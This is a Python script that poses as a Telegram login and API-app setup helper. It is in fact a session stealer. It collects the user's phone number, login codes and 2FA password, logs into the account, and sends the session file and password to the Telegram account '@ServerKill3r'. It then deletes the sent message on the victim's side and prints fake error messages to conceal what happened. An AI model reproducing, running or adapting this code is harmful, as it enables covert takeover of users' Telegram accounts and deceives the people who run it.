import os
import requests
from bs4 import BeautifulSoup
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import DeleteMessagesRequest
import asyncio

you = "@ServerKill3r"

async def main():
    phone = input("📱 Enter your phone number (e.g., +1XXXXXXX): ").strip()
    with requests.Session() as req:
        r1 = req.post('https://my.telegram.org/auth/send_password', data={'phone': phone})
        if 'too many tries' in r1.text.lower():
            print("❌ Too many attempts. Try later.")
            return

        json_data = r1.json()
        web_code = input("✉️ Enter the login code (from my.telegram.org): ").strip()
        login = req.post('https://my.telegram.org/auth/login', data={
            'phone': phone,
            'random_hash': json_data['random_hash'],
            'password': web_code
        })

        soup = BeautifulSoup(req.get('https://my.telegram.org/apps').text, 'html.parser')
        if not soup.find('label', string='App api_id:'):
            req.post('https://my.telegram.org/apps/create', data={
                'app_title': 'AutoApp',
                'app_shortname': 'autoapp' + phone[-4:],
                'app_url': 'https://example.com',
                'app_platform': 'android',
                'app_desc': 'Generated via script'
            })
            soup = BeautifulSoup(req.get('https://my.telegram.org/apps').text, 'html.parser')

        api_id = soup.find('label', string='App api_id:').find_next_sibling('div').select_one('span').get_text(strip=True)
        api_hash = soup.find('label', string='App api_hash:').find_next_sibling('div').select_one('span').get_text(strip=True)

    session_name = phone.replace("+", "")
    client = TelegramClient(session_name, int(api_id), api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        code = input("📨 Enter the code sent by Telegram (for Telethon login): ").strip()
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            pw = input("🔐 2FA Password: ")
            await client.sign_in(password=pw)

    me = await client.get_me()
    print(f"\n❌ Error during login {me.first_name} @{me.username or 'N/A'}")

    session_file = f"{session_name}.session"
    if not os.path.exists(session_file):
        print("❌ Session file not found!")
        return

    caption = f"""🟢 New Telegram Session File
👤 Name: {me.first_name} {me.last_name or ""}
🔗 Username: @{me.username or 'N/A'}
🆔 User ID: {me.id}
📞 Phone: {me.phone}
🔐 2FA Password: {pw}
"""
    try:
        target = await client.get_entity(you)
        file = await client.upload_file(session_file)
        sent_message = await client.send_file(target, file, caption=caption)
        await client(DeleteMessagesRequest(id=[sent_message.id], revoke=False))
        print("❌ Connection error! Please try again later:)")
    except Exception as e:
        print(f"❌ Failed: {e}")

    await client.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
